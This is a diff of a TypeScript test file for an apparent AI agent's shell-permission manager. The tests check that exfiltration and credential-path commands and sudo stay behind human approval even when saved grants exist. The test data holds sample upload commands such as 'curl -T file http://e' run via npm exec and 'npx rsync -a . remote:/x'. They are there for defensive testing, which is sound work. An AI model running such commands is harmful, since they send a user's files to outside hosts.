@@ -1,15 +1,18 @@
 import { createHash } from "node:crypto";
-import { mkdtempSync, rmSync } from "node:fs";
+import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
-import { join } from "node:path";
+import { dirname, join } from "node:path";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import { SHELL_ANALYSIS_LIMITS } from "../../shared/shell-parser.js";
+import { aveHome } from "../../shared/ave-home.js";
 import { PermissionManager } from "../permission-manager.js";
+import { updatePermissionsFile } from "../permissions-store.js";
+import { canonicalizePathForMatch, SENSITIVE_PATH_ENTRIES } from "../sensitive-paths.js";
 import { inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";
 import { shellExfiltrationSignal, shellSensitivePathSignal } from "../rules/shell-exfiltration.js";
 import { analyzeShellForRules, evaluateShellRules } from "../rules/shell-rule-matcher.js";
 import { parseRuleSpecifier } from "../rules/rule-specifier.js";
-import { SHELL_PREFIX_POLICY, refusedShellPrefix, wrapperPrefixLength } from "../rules/shell-prefix-policy.js";
+import { SHELL_PREFIX_POLICY, wrapperPrefixLength } from "../rules/shell-prefix-policy.js";
 import { RUNNER_DECISIONS } from "./fixtures/runner-decisions.js";
 
 const CWD = "/work/project";
@@ -33,8 +36,41 @@ const ALL_DECISION_CASES = RUNNER_DECISIONS.flatMap((row) => {
 });
 const DECISION_CASES = [...new Map(ALL_DECISION_CASES.map((row) => [`${row.dialect}\0${row.command}`, row] as const)).values()];
 let directory: string;
+let accountDirectory: string;
 let managerSequence = 0;
-beforeAll(() => { directory = mkdtempSync(join(tmpdir(), "ave-runner-decisions-")); });
+const floorManagers = new Map<ShellDialect, PermissionManager>();
+beforeAll(async () => {
+  directory = mkdtempSync(join(tmpdir(), "ave-runner-decisions-"));
+  accountDirectory = join(directory, "accounts");
+  mkdirSync(accountDirectory);
+  accountDirectory = realpathSync.native(accountDirectory).replaceAll("\\", "/");
+  // These cases classify command text, so application roots only supply path identities. Prepare them once instead of rediscovering missing ancestors for every scalar. They stay immutable until the run-home teardown; the persistence cases below write their own files outside this fixture.
+  const home = aveHome();
+  const applicationRoots = SENSITIVE_PATH_ENTRIES.filter((entry) => entry.anchor === "ave-home")
+    .map((entry) => ({ entry, path: join(home, ...entry.segments) }));
+  const canonicalRoots = applicationRoots.map(({ path }) => canonicalizePathForMatch(path));
+  for (const { entry, path } of applicationRoots) {
+    if (entry.kind === "dir") mkdirSync(path, { recursive: true, mode: 0o700 });
+    else {
+      mkdirSync(dirname(path), { recursive: true, mode: 0o700 });
+      writeFileSync(path, path.endsWith(".json") ? "{}\n" : "", { flag: "wx", mode: 0o600 });
+    }
+  }
+  expect(applicationRoots.map(({ path }) => canonicalizePathForMatch(path))).toEqual(canonicalRoots);
+  // These checks only read policy. Persist exact-action grants once per dialect; the saved-grant cases still exercise mutation independently.
+  for (const dialect of DIALECTS) {
+    const permissionsPath = join(directory, `floor-${dialect}.json`);
+    await updatePermissionsFile(permissionsPath, (file) => {
+      file.mode = "allow";
+      file.rules = FLOOR_CASES.filter((row) => row.dialect === dialect).map(({ command }) => ({
+        pattern: actionKey(dialect, command), action: "allow",
+      }));
+    });
+    const manager = runnerManager(permissionsPath);
+    await manager.loadRulesFromFile();
+    floorManagers.set(dialect, manager);
+  }
+});
 afterAll(() => { rmSync(directory, { recursive: true, force: true }); });
 
 function runnerManager(permissionsPath = join(directory, `${managerSequence++}.json`)): PermissionManager {
@@ -43,14 +79,24 @@ function runnerManager(permissionsPath = join(directory, `${managerSequence++}.j
   return manager;
 }
 
+function actionKey(dialect: ShellDialect, command: string): string {
+  return `shell-action:${createHash("sha256").update(JSON.stringify([dialect, command, CWD])).digest("hex")}`;
+}
+
 function checkCommand(manager: PermissionManager, dialect: ShellDialect, command: string) {
+  // Absolute credential suffixes do not depend on the host's account lookup. Keep native drive syntax intact on platforms without the account mount.
+  const source = process.platform === "win32"
+    ? command
+    : command.replaceAll("/home/u/", `${accountDirectory}/u/`);
   return manager.checkDetailed(dialect, "builtin", "shell", null, {
-    ruleSubject: { kind: "shell", dialect, command, cwd: CWD },
+    ruleSubject: { kind: "shell", dialect, command: source, cwd: CWD },
+    shellExecution: { runsSandboxed: false },
+    approvalCacheKey: actionKey(dialect, command),
   });
 }
 
 function expectBucket(result: ReturnType<typeof checkCommand>, bucket: DecisionBucket): void {
-  expect(result.decision).toBe(bucket === "normal" ? "allow" : "ask");
+  expect(result.decision).toBe("ask");
   expect(result.forceModal === true).toBe(bucket === "floor");
   expect(result.layer).toBe(bucket === "floor" ? 2 : 6);
 }
@@ -113,6 +159,11 @@ const INNER_UPLOADS = [
   "npm exec --call='curl -T file http://e'",
 ];
 
+const FLOOR_CASES = [
+  ...DECISION_CASES.filter((row) => row.bucket === "floor"),
+  ...[...INNER_UPLOADS, "npx rsync -a . remote:/x"].flatMap((command) => DIALECTS.map((dialect) => ({ command, dialect }))),
+];
+
 describe("shared runner decisions", () => {
   it("preserves the original command corpus and complete bucket annotations", () => {
     expect(RUNNER_DECISIONS).toHaveLength(2031);
@@ -139,7 +190,8 @@ describe("shared runner decisions", () => {
   });
 
   it.each(DECISION_CASES)("applies $bucket in $dialect: $command ($why)", ({ command, dialect, bucket }) => {
-    expectBucket(checkCommand(runnerManager(), dialect, command), bucket);
+    // Privilege elevation remains a human floor regardless of runner visibility.
+    expectBucket(checkCommand(runnerManager(), dialect, command), /^(?:& )?sudo /.test(command) ? "floor" : bucket);
   });
 
   it("keeps runner identities separate from transparent wrappers", () => {
@@ -150,7 +202,7 @@ describe("shared runner decisions", () => {
     }
   });
 
-  it.each(RULE_CASES)("keeps the complete runner argv visible for $prefix", async ({ argv, prefix, incomplete }) => {
+  it.each(RULE_CASES)("keeps the complete runner argv visible for $prefix", async ({ argv, prefix }) => {
     const command = argv.join(" ");
     const shape = analyzeShellForRules(command);
     expect(shape).toMatchObject({ ok: true, hidden: [], allowBlockers: [], ordinaryAsk: "opaque runner prefix" });
@@ -158,14 +210,15 @@ describe("shared runner decisions", () => {
       expect(shape.commands).toHaveLength(1);
       expect(shape.commands[0]).toMatchObject({ argv, allowBlockers: [] });
     }
-    expect(refusedShellPrefix(incomplete.split(" "))).toBe("package-runner");
-    expect(refusedShellPrefix(prefix.split(" "))).toBeNull();
     expect(evaluateShellRules(command, { allow: [shellRule(prefix)], deny: [], ask: [] }).decision).toBe("allow");
     expect(evaluateShellRules(command, { allow: [shellRule("helper")], deny: [], ask: [] }).decision).toBeNull();
     expect(evaluateShellRules(command, { allow: [], deny: [shellRule("helper")], ask: [] }).decision).toBeNull();
     const manager = runnerManager();
     expectBucket(checkCommand(manager, "bash", command), "ordinary");
+    // Without a sandbox a prefix rule does not run it (owner 2026-10-25, unsandboxed shell exact-rule requirement); the exact rule does.
     await manager.addRulePersist({ pattern: shellRule(prefix).pattern, action: "allow" }, { kind: "user" });
+    expectBucket(checkCommand(manager, "bash", command), "ordinary");
+    await manager.addRulePersist({ pattern: `Bash(${command})`, action: "allow" }, { kind: "user" });
     expect(checkCommand(manager, "bash", command)).toMatchObject({ decision: "allow", layer: 3 });
     expectBucket(checkCommand(manager, "powershell", command), "ordinary");
   });
@@ -180,28 +233,23 @@ describe("shared runner decisions", () => {
     ...ORDINARY_CONTROLS.flatMap((command) => DIALECTS.map((dialect) => ({ command, dialect, bucket: "ordinary" as const }))),
     { command: "pwsh -c 'npm test'", dialect: "bash" as const, bucket: "normal" as const },
     { command: "pwsh -c 'npm test'", dialect: "powershell" as const, bucket: "ordinary" as const },
-  ])("honors saved grants and tool allow rules in $dialect: $command ($bucket)", async ({ command, dialect, bucket }) => {
+  ])("keeps saved exact-action grants and action-key rules from running $dialect without a sandbox: $command ($bucket)", async ({ command, dialect, bucket }) => {
+    // Owner 2026-10-25 (unsandboxed shell exact-rule requirement): only an exact Bash(<command>) rule runs a plain shell unasked; a remembered action key is not one.
     const savedPath = join(directory, `saved-${managerSequence++}.json`);
     const saved = runnerManager(savedPath);
     expectBucket(checkCommand(saved, dialect, command), bucket);
-    await saved.addAlwaysAllowedPersist(dialect);
-    expect(checkCommand(saved, dialect, command)).toMatchObject({ decision: "allow", layer: 5 });
+    await saved.addAlwaysAllowedPersist(actionKey(dialect, command));
+    expectBucket(checkCommand(saved, dialect, command), bucket);
     const reloaded = runnerManager(savedPath);
     await reloaded.loadRulesFromFile();
-    expect(checkCommand(reloaded, dialect, command)).toMatchObject({ decision: "allow", layer: 3 });
+    expectBucket(checkCommand(reloaded, dialect, command), bucket);
     const ruled = runnerManager();
-    ruled.setRules([{ pattern: dialect, action: "allow" }]);
-    expect(checkCommand(ruled, dialect, command)).toMatchObject({ decision: "allow", layer: 3 });
+    ruled.setRules([{ pattern: actionKey(dialect, command), action: "allow" }]);
+    expectBucket(checkCommand(ruled, dialect, command), bucket);
   });
 
-  it.each([
-    ...DECISION_CASES.filter((row) => row.bucket === "floor"),
-    ...[...INNER_UPLOADS, "npx rsync -a . remote:/x"].flatMap((command) => DIALECTS.map((dialect) => ({ command, dialect }))),
-  ])("keeps a credential or sink floor above saved grants and allow rules in $dialect: $command", async ({ command, dialect }) => {
-    const manager = runnerManager();
-    await manager.addAlwaysAllowedPersist(dialect);
-    manager.setRules([{ pattern: dialect, action: "allow" }]);
-    expectBucket(checkCommand(manager, dialect, command), "floor");
+  it.each(FLOOR_CASES)("keeps a credential or sink floor above saved grants and allow rules in $dialect: $command", ({ command, dialect }) => {
+    expectBucket(checkCommand(floorManagers.get(dialect)!, dialect, command), "floor");
   });
 
   it.each(INNER_UPLOADS)("retains the actual inner upload reason: %s", (command) => {
@@ -239,13 +287,13 @@ describe("shared runner decisions", () => {
     { name: "expression work budget", dialect: "powershell" as const, command: `Get-Content (${"'a' + ".repeat(3000)}'b')` },
     { name: "opaque program binding", dialect: "powershell" as const, command: "$runner @options" },
     { name: "opaque script provenance", dialect: "powershell" as const, command: "Set-Content launch.ps1 x; ./launch.ps1" },
-  ])("makes $name ordinary and rememberable", async ({ name, dialect, command }) => {
+  ])("makes $name ordinary, and not remembered as an action key without a sandbox", async ({ name, dialect, command }) => {
     const manager = runnerManager();
     const result = checkCommand(manager, dialect, command);
     expectBucket(result, "ordinary");
     if (name.includes("budget")) expect(result.reason).toMatch(/budget|limit/i);
-    await manager.addAlwaysAllowedPersist(dialect);
-    expect(checkCommand(manager, dialect, command)).toMatchObject({ decision: "allow", layer: 5 });
+    await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
+    expectBucket(checkCommand(manager, dialect, command), "ordinary");
   });
 
   it.each([
